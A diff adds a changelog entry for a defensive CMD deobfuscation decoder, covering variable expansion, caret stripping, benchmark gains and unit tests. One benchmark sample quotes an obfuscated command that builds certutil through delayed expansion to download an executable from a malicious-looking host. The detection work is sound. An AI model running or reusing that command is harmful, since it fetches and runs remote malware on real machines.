@@ -7,6 +7,35 @@ core decoder. Everything must work offline.
 
 ---
 
+## 🟢 RC2.7 · CMD Reconstruction · DELIVERED (2026-02-XX)
+
+**Branch:** `feature/rc2` · **Scope:** Backend engine — new `decoders/cmd_reconstruct.py`
+**Benchmark evidence:** `/app/memory/rc27_cmd.json` — **26/31 chain-complete (83.9%)** up from 25/31 (80.6%) · **+3.3pp** · zero false-positive IOCs · **86/86** unit tests pass.
+
+### Added — new deterministic decoder `cmd-reconstruct`
+| # | Feature | Detail |
+|---|---------|--------|
+| 1 | `%VAR%` classic expansion | Multi-pass (`%A%%B%` cascades). Only fires when a matching `SET VAR=...` exists in the same payload — `%TEMP%` stays literal. |
+| 2 | `!VAR!` delayed expansion | For `cmd /V:ON` blocks. Multi-pass for nested resolution. |
+| 3 | Caret escape stripping | `c^m^d.exe` → `cmd.exe`. Preserves `^` at end-of-line (real CMD line-continuation). |
+| 4 | `CALL FOO` reveal | Appends resolved literal inline via `<#=> ... <#=>` marker so LOLBAS names reach IOC/MITRE extractors even through CALL indirection. |
+| 5 | Confidence tuning | Combo signals hit conf 0.9 (beats extract-wrapper 0.65) so reconstructed LOLBAS binaries surface. |
+
+### Fixed benchmark sample
+- `cmd-delayed-expansion`: `cmd /V:ON /c "set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://mal.io/x.exe"` → chain-complete (was incomplete). CMD category now 3/3 (100%).
+
+### Unit tests
+`/app/backend/tests/test_cmd_reconstruct.py` — 12 tests locking:
+- Delayed expansion end-to-end + direct-call
+- Percent-var single, nested cascade, unresolved-stays-literal
+- Caret collapse + eol-caret preservation
+- CALL-of-var reveal
+- Detection precision guards (no false positives on plain env-vars or benign text)
+- Zero-false-positive-IOC gate
+
+
+---
+
 ## 🟢 RC2.6 · PowerShell P0.3 Reconstruction · DELIVERED (2026-02-XX)
 
 **Branch:** `feature/rc2` · **Scope:** Backend engine — `decoders/ps_reconstruct.py` only
